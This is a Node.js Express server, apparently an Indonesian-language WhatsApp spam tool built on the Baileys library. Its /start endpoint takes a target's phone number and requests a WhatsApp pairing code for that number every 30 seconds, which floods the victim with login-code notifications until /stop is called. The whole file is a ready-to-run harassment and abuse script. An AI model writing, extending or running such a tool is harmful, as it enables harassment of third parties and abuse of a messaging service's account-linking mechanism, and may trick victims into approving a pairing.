const express = require('express');
const pino = require('pino');
const { useMultiFileAuthState, fetchLatestBaileysVersion, Browsers, makeCacheableSignalKeyStore, default: makeWASocket } = require('@whiskeysockets/baileys');
const NodeCache = require('node-cache');
const path = require('path');
const chalk = require('chalk');

const app = express();
const port = process.env.PORT || 3000;

let spam;
let interval;

app.use(express.static('public'));
app.use(express.json());

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.post('/start', async (req, res) => {
  const { phoneNumber } = req.body;
  if (!phoneNumber) {
    return res.status(400).json({ error: 'Nomor telepon tidak diberikan' });
  }

  try {
    const { version } = await fetchLatestBaileysVersion();
    const { state } = await useMultiFileAuthState('./targetsessi');
    const msgRetryCounterCache = new NodeCache();

    spam = makeWASocket({
      logger: pino({ level: 'silent' }),
      auth: state,
      browser: Browsers.windows('Firefox'),
      printQRInTerminal: true,
      msgRetryCounterCache: msgRetryCounterCache,
    });

    if (!spam.authState.creds.registered) {
      console.log(chalk.bgBlack(chalk.greenBright(`Spamming pairing code for: ${phoneNumber}`)));
      interval = setInterval(async () => {
        try {
          let code = await spam.requestPairingCode(phoneNumber);
          code = code?.match(/.{1,4}/g)?.join('-') || code;
          console.log(chalk.bgBlack(chalk.greenBright(`Pairing Code: ${code}`)));
        } catch (error) {
          console.error('Error generating pairing code:', error);
        }
      }, 30000); // Ulang setiap 30 detik
    }

    res.status(200).json({ message: 'Spam started' });
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ error: 'Failed to start spamming' });
  }
});

app.post('/stop', (req, res) => {
  if (interval) {
    clearInterval(interval);
    interval = null;
    console.log(chalk.bgBlack(chalk.redBright('Spam stopped')));
    res.status(200).json({ message: 'Spam stopped' });
  } else {
    res.status(400).json({ error: 'Spam not running' });
  }
});

app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
